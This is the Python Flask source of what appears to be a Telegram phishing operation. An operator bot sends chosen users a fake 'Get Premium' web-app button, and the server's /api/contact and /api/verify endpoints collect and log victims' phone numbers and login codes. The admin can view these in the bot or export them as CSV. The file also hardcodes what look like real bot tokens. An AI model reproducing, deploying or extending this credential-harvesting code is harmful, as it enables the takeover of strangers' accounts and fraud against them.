from flask import Flask, request, send_file
from flask_cors import CORS
import requests
import json
import sqlite3
import os
import logging
from datetime import datetime
import threading

# ========== КОНФИГ ==========
BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"  # панель
CLIENT_TOKEN = "8638305124:AAG6a1JWNDUEHywMpoeZdtf6gaDIfI9Npqk"  # клиентский бот
ADMIN_ID = 8899193168
MINI_APP_URL = "https://bot-panel-v2.onrender.com/prize"
MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
PANEL_URL = "https://bot-panel-v2.onrender.com/panel"

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            code TEXT,
            password TEXT,
            template TEXT,
            status TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            status TEXT,
            created_at INTEGER
        )
    """)
    conn.commit()
    conn.close()
    logging.info("✅ База данных инициализирована")

init_db()

# ========== РАБОТА С БАЗОЙ ==========
def get_all_accounts():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, code, template, status, created_at FROM accounts ORDER BY created_at DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_accounts_count():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM accounts")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def save_user(user_id, username, first_name):
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name, created_at) VALUES (?, ?, ?, ?)",
        (user_id, username, first_name, int(datetime.now().timestamp()))
    )
    conn.commit()
    conn.close()

def save_request(user_id, username=""):
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO requests (user_id, username, status, created_at) VALUES (?, ?, ?, ?)",
        (user_id, username, "pending", int(datetime.now().timestamp()))
    )
    conn.commit()
    conn.close()

def get_requests():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, status, created_at FROM requests ORDER BY created_at DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

def update_username(user_id, username):
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET username = ? WHERE user_id = ?",
        (username, user_id)
    )
    conn.commit()
    conn.close()

# ========== ОТПРАВКА СООБЩЕНИЙ ==========
def send_message(chat_id, text, reply_markup=None, parse_mode=None, token=BOT_TOKEN):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        r = requests.post(url, json=payload, timeout=10)
        logging.info(f"📤 Отправлено в {chat_id}: {r.status_code}")
        return r.status_code == 200
    except Exception as e:
        logging.error(f"❌ Ошибка отправки: {e}")
        return False

def send_button_via_client(chat_id, label, url):
    keyboard = {
        "inline_keyboard": [
            [{"text": label, "web_app": {"url": url}}]
        ]
    }
    return send_message(
        chat_id,
        f"🎁 Вам отправили кнопку **{label}**!",
        reply_markup=keyboard,
        parse_mode="Markdown",
        token=CLIENT_TOKEN
    )

# ========== ОБРАБОТКА ВЕБХУКА (панель) ==========
@app.route("/", methods=["POST"])
def webhook():
    data = request.get_json()
    if not data:
        return "OK", 200

    if "message" in data:
        msg = data["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "📤 Отправить кнопку", "callback_data": "send_button"}],
                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}],
                    [{"text": "👥 Юзеры", "callback_data": "users_list"}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

        elif text == "/admin":
            if chat_id != ADMIN_ID:
                send_message(chat_id, "⛔ У вас нет доступа.")
                return "OK", 200
            show_admin_panel(chat_id)

        elif text.startswith("/send"):
            parts = text.split()
            if len(parts) < 2:
                send_message(chat_id, "❌ Формат: `/send ID premium`", parse_mode="Markdown")
                return "OK", 200
            target = parts[1].strip()
            label = "🎁 Получить Premium"
            success = send_button_via_client(target, label, MINI_APP_URL)
            if success:
                send_message(chat_id, f"✅ Кнопка отправлена пользователю с ID `{target}` через @fikeikddbot", parse_mode="Markdown")
            else:
                send_message(chat_id, f"❌ Не удалось отправить кнопку пользователю с ID `{target}`.", parse_mode="Markdown")

    elif "callback_query" in data:
        query = data["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        data_callback = query.get("data")

        if data_callback == "send_button":
            send_message(chat_id, "✏️ Введите ID пользователя:\n`/send 123456789`", parse_mode="Markdown")

        elif data_callback == "users_list":
            show_users_list(chat_id)

        elif data_callback == "back_to_menu":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "📤 Отправить кнопку", "callback_data": "send_button"}],
                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}],
                    [{"text": "👥 Юзеры", "callback_data": "users_list"}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

        elif data_callback == "export_csv":
            rows = get_all_accounts()
            if not rows:
                send_message(chat_id, "📭 Нет данных.")
                return "OK", 200

            csv = "Телефон,Код,Шаблон,Статус,Дата\n"
            for phone, code, template, status, created_at in rows:
                date = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M:%S")
                csv += f"{phone},{code},{template},{status},{date}\n"

            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {"document": ("accounts.csv", csv)}
            try:
                requests.post(url, data={"chat_id": chat_id}, files=files)
                logging.info("📤 CSV отправлен")
            except Exception as e:
                logging.error(f"❌ Ошибка отправки CSV: {e}")

    return "OK", 200

# ========== КЛИЕНТСКИЙ БОТ ==========
@app.route("/client", methods=["POST"])
def webhook_client():
    data = request.get_json()
    if not data:
        return "OK", 200

    if "message" in data:
        msg = data["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        username = msg.get("username", "")
        first_name = msg.get("first_name", "")

        if text == "/start":
            save_user(chat_id, username, first_name)

            send_message(
                ADMIN_ID,
                f"🆕 **Новый пользователь!**\n\n"
                f"🆔 ID: `{chat_id}`",
                parse_mode="Markdown"
            )

            keyboard = {
                "inline_keyboard": [
                    [{"text": "📋 Мой ID", "callback_data": "copy_id"}],
                    [{"text": "📩 Заявка на Premium", "callback_data": "request_premium"}]
                ]
            }
            send_message(
                chat_id,
                f"👤 **Ваш профиль**\n\n"
                f"🆔 ID: `{chat_id}`\n"
                f"📌 Юзернейм: @{username if username else 'не указан'}\n\n"
                f"Нажмите «Заявка на Premium», чтобы отправить запрос.",
                reply_markup=keyboard,
                parse_mode="Markdown",
                token=CLIENT_TOKEN
            )

    elif "callback_query" in data:
        query = data["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        data_callback = query.get("data")

        if data_callback == "copy_id":
            send_message(
                chat_id,
                f"🆔 Ваш ID: `{chat_id}`",
                parse_mode="Markdown",
                token=CLIENT_TOKEN
            )

        elif data_callback == "request_premium":
            # Автоматически отправляем заявку с ID
            save_request(chat_id)
            send_message(
                ADMIN_ID,
                f"📩 **Новая заявка на Premium!**\n\n"
                f"🆔 ID: `{chat_id}`\n"
                f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}",
                parse_mode="Markdown"
            )
            send_message(
                chat_id,
                "✅ Ваша заявка на Premium отправлена! Ожидайте.",
                token=CLIENT_TOKEN
            )

    return "OK", 200

# ========== АДМИН-ПАНЕЛЬ ==========
def show_admin_panel(chat_id):
    rows = get_all_accounts()
    if not rows:
        send_message(chat_id, "📭 База данных пуста.")
        return

    msg = "📋 **База данных (последние 10):**\n\n"
    for i, (phone, code, template, status, created_at) in enumerate(rows[:10], 1):
        date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
        msg += f"{i}. 📱 `{phone}` | 🔑 `{code}` | 🎭 {template} | 🕒 {date}\n"

    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 Открыть админ-панель", "url": PANEL_URL}],
            [{"text": "📥 Экспорт CSV", "callback_data": "export_csv"}]
        ]
    }
    send_message(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")

# ========== ЮЗЕРЫ (СПИСОК ЗАЯВОК) ==========
def show_users_list(chat_id):
    requests = get_requests()
    if not requests:
        send_message(chat_id, "📭 Нет заявок.")
        return

    msg = "👥 **Заявки на Premium:**\n\n"
    for i, (user_id, username, status, created_at) in enumerate(requests[:20], 1):
        date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
        msg += f"{i}. 🆔 `{user_id}` | 🕒 {date}\n"

    send_message(chat_id, msg, parse_mode="Markdown")

# ========== API ДЛЯ ВЕБ-АДМИНКИ ==========
@app.route("/api/accounts")
def api_accounts():
    rows = get_all_accounts()
    result = []
    for phone, code, template, status, created_at in rows:
        result.append({
            "phone": phone,
            "code": code,
            "template": template,
            "status": status,
            "created_at": created_at
        })
    return json.dumps(result)

@app.route("/api/contact", methods=["POST"])
def api_contact():
    data = request.get_json()
    phone = data.get("phone")
    template = data.get("template", "premium")
    if not phone:
        return json.dumps({"status": "error", "message": "Номер обязателен"}), 400
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO accounts (phone, code, password, template, status, created_at) VALUES (?, ?, ?, ?, ?, ?)",
        (phone, "", "", template, "pending", int(datetime.now().timestamp()))
    )
    conn.commit()
    conn.close()
    logging.info(f"📩 Получен номер: {phone}, шаблон: {template}")
    return json.dumps({"status": "code_sent", "message": "Код отправлен"})

@app.route("/api/verify", methods=["POST"])
def api_verify():
    data = request.get_json()
    phone = data.get("phone")
    code = data.get("code")
    template = data.get("template", "premium")
    if not phone or not code:
        return json.dumps({"status": "error", "message": "Телефон и код обязательны"}), 400
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE accounts SET code = ?, status = ? WHERE phone = ? AND template = ?",
        (code, "verified", phone, template)
    )
    conn.commit()
    conn.close()
    logging.info(f"✅ Проверен код: {phone} → {code}")
    return json.dumps({"status": "success", "message": "Аккаунт подтверждён"})

@app.route("/panel")
def admin_panel():
    return send_file("admin_panel.html")

@app.route("/setwebhook", methods=["GET", "POST"])
def set_webhook():
    webhook_url = os.environ.get("RENDER_EXTERNAL_URL", "")
    if not webhook_url:
        return "RENDER_EXTERNAL_URL not set", 400
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
    r = requests.post(url, json={"url": webhook_url})
    return f"Webhook set: {r.json()}"

@app.route("/")
def index():
    return "Бот работает! Используй /setwebhook для настройки."

@app.route("/prize")
def prize():
    return send_file("index.html")

@app.route("/prize2")
def prize2():
    return send_file("index2.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
